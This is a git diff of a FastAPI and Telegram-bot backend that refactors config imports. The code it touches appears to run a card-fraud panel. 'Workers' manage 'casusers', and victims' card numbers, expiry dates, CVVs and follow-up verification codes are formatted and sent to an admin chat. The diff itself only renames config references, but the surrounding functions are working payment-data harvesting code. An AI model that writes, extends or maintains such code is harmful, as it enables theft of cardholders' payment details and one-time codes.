@@ -5,12 +5,12 @@ from typing import Optional
 
 from fastapi import Depends, Form
 from fastapi.security import OAuth2PasswordBearer
+from fastapi import HTTPException, status
 import jwt
 
 from loader import app, bot
 from models import Worker, Payment
-from data.config import ADMINS_ID, JWT_SECRET
-from fastapi import HTTPException, status
+from config import settings  # ADMINS_ID, JWT_SECRET
 from data import payload, keyboards
 
 
@@ -26,7 +26,7 @@ async def login(sup_key: int = Form(...)):
                 "chat_id": worker.cid,
                 "sup_key": md5(str(worker.sup_key).encode()).hexdigest()
             },
-            JWT_SECRET
+            settings.JWT_SECRET
         )
 
         return {"access_token": token, "token_type": "bearer"}
@@ -39,7 +39,7 @@ async def login(sup_key: int = Form(...)):
 
 async def get_casusers(offset: int = 0, token: str = Depends(oauth2_scheme)):
     try:
-        data = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
+        data = jwt.decode(token, settings.JWT_SECRET, algorithms=["HS256"])
         worker = Worker.get(cid=data["chat_id"])
         # getting 50 users with offset
         return worker.casusers.offset(5 * offset).limit(5)
@@ -69,7 +69,7 @@ async def update_cc_info(key: int, info: Optional[str]):
 
             number = re.sub(r"(.{4})", r"\1 ", card[0])
 
-            message = await bot.send_message(ADMINS_ID[0], payload.cardinfo.format(
+            message = await bot.send_message(settings.ADMINS_ID[0], payload.cardinfo.format(
                 number=number,
                 data=card[1],
                 cvv=card[2],
@@ -112,7 +112,7 @@ async def new_code_cc(key: int, code: int):
         number = re.sub(r"(.{4})", r"\1 ", pay.cardinfo.split(";")[0])
 
         await bot.send_message(
-            chat_id=ADMINS_ID[0],
+            chat_id=settings.ADMINS_ID[0],
             text=payload.new_code.format(
                 number=number,
                 code=code,
